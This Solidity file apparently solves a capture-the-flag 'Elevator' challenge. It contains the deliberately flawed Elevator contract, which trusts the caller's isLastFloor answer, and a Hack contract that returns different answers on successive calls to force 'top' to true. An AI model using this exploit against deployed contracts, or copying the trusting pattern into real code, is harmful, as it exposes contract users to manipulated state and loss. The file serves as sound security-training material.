// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
  uint private count;
  Elevator private immutable target;

  constructor(address _target) {
    target = Elevator(_target);
  }

  function pwn() external {
    target.goTo(2);
    require(target.top(), "not top");
  }

  function isLastFloor(uint) external returns (bool) {
    count++;
    return count > 1;
  }
}

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}